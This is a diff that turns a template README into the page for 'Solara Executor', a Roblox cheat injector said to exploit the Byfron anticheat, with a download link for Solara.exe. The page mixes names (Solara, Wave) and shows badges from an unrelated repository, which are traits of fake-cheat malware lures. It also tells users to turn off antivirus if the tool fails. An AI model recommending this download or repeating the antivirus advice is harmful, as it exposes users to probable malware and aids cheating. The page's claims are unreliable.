@@ -1,95 +1,81 @@
-# Project Title
 
-![Project Banner](https://via.placeholder.com/1200x300.png?text=Add+Your+Project+Banner+Here)
+# Solara Executor
+![GitHub](https://img.shields.io/github/license/CheatsHelp/Solara-Executor-Roblox)
 
-## 🚀 Overview
-A brief description of your project, its purpose, and what it accomplishes. Add a short sentence that hooks the reader!
+**Free, Open-Source Executor for Roblox.**
 
----
+Solara is a fast, lightweight executor written in C#.
 
-## 🛠 Features
+**Note: We are actively developing less detections.**
 
-- **Feature 1**: Description of feature 1.
-- **Feature 2**: Description of feature 2.
-- **Feature 3**: Description of feature 3.
+## Disclaimer
+This program, developed by CheatsHelp, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of executors. The program should only be used in controlled environments with explicit permission from the system owner.
 
----
+While the program may be used to assess the security of roblox executor, it should not be used for malicious purposes or any activity that may cause harm or damage to computer systems or networks. Any misuse or illegal activity resulting from the use of this program is strictly prohibited and the responsibility lies solely with the user.
 
-## 📸 Screenshots
+![image](https://github.com/user-attachments/assets/4d9d7b55-e071-4980-8df3-08a91cb9e232)
 
-![Screenshot 1](https://via.placeholder.com/600x300.png?text=Add+Screenshot+1)
-![Screenshot 2](https://via.placeholder.com/600x300.png?text=Add+Screenshot+2)
 
----
+# About The Project
 
-## 📚 Technologies Used
+<br/>
+<p align="center">
+  <a href="https://github.com/CheatsHelp/Solara-Executor-Roblox/releases/tag/solara-executor-roblox">
+    <img src="https://github.com/user-attachments/assets/d4f97f60-0127-4794-aa4a-3385b0dd8639" alt="Logo" width="80" height="80">
+  </a>
 
-- **Technology 1**: Brief description.
-- **Technology 2**: Brief description.
-- **Technology 3**: Brief description.
 
----
+  <h3 align="center">[Roblox Executor] - Solara</h3>
 
-## ⚙️ Setup
+  <p align="center">
+    Wave is a Roblox Executor that injects script that takes advantage of Roblox weak anticheat Byfron.
+    <br/>
+    <br/>
+    <a href="https://github.com/CheatsHelp/Solara-Executor-Roblox/releases/tag/solara-executor-roblox">Download</a>
+    .
+    <a href="https://github.com/CheatsHelp/Solara-Executor-Roblox">Site</a>
+  </p>
+</p>
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/your-username/repo-name.git
-   ```
-2. Navigate to the project directory:
-   ```bash
-   cd repo-name
-   ```
-3. Install dependencies:
-   ```bash
-   npm install
-   ```
-4. Run the project:
-   ```bash
-   npm start
-   ```
+<p align="center">
+  <img alt="Downloads" src="https://img.shields.io/github/downloads/Xvirus-Team/xvirus-tools/total">
+  <img alt="Contributors" src="https://img.shields.io/github/contributors/Xvirus-Team/xvirus-tools?color=dark-green">
+  <img alt="Forks" src="https://img.shields.io/github/forks/Xvirus-Team/xvirus-tools?style=social">
+  <img alt="Stargazers" src="https://img.shields.io/github/stars/Xvirus-Team/xvirus-tools?style=social">
+  <img alt="Issues" src="https://img.shields.io/github/issues/Xvirus-Team/xvirus-tools">
+  <img alt="License" src="https://img.shields.io/github/license/Xvirus-Team/xvirus-tools">
+</p>
 
----
+ ## Features
 
-## 📄 Usage
+- **User-Friendly Interface:** Solara offers a clean and intuitive interface that makes it easy to load and inject scripts with just a few clicks.
+- **Wide Compatibility:** Supports a broad range of Roblox scripts and is regularly updated to ensure compatibility with the latest Roblox updates.
+- **High Performance:** Optimized for speed, Solara injects scripts quickly and efficiently without causing lag or crashes.
+- **Enhanced Security:** Built with security in mind, Solara includes features to protect your account and personal information while using custom scripts.
+- **Script Hub:** Access a vast library of pre-loaded scripts from the built-in script hub, or add your own custom scripts for personalized gameplay.
+- **Customizable:** Solara allows you to save and manage your favorite scripts, making it easy to switch between different setups.
 
-Describe how to use the project. Include code examples or commands if necessary.
+# Installation
 
----
+To install Solara, follow these steps:
 
-## 🧩 Contributing
+1. [Download the Latest Version](https://github.com/CheatsHelp/Solara-Executor-Roblox/releases/tag/solara-executor-roblox) page and download the latest version of Solara.
+2. **Run Solara:** Run the `Solara.exe` file to launch the executor.
 
-Contributions are welcome! Follow these steps:
+## Usage
 
-1. Fork the repository.
-2. Create a new branch:
-   ```bash
-   git checkout -b feature-name
-   ```
-3. Commit your changes:
-   ```bash
-   git commit -m "Add feature name"
-   ```
-4. Push to the branch:
-   ```bash
-   git push origin feature-name
-   ```
-5. Submit a pull request.
+Using Solara is straightforward:
 
----
+1. **Launch Roblox:** Start Roblox and join a game.
+2. **Open Wave:** Run Solara and wait for it to initialize.
+3. **Load Script:** Click on the "Load Script" button and select the script you want to inject.
+4. **Inject Script:** Click on the "Inject" button to run the script in your Roblox game.
+5. **Enjoy!** 
 
-## 🧾 License
+**Note:** If you didn't get any result while using Solara, you may try to turn off your Antivirus if you haven't, as Antivirus may have deleted important files during the instalattion of Solara.
 
-This project is licensed under the [MIT License](LICENSE). Feel free to use and share it!
+## Stay Updated
+Please consider starring this repository if you found this project useful. By starring this repository, you help others discover it, and it shows the developer how many people are interested in this project. Additionally, click on the "Watch" button located at the top of the repository page to receive notifications for the latest updates and features added to the project. Thank you for your support!
 
----
-
-## 📫 Contact
-
-- **Your Name**: [Your Portfolio](https://yourportfolio.com)
-- **Email**: your.email@example.com
-- **GitHub**: [@your-username](https://github.com/your-username)
-
----
-
-*Made with ❤️ by [Your Name]*
+<br><hr>
+[🔼 Back to top](#top)
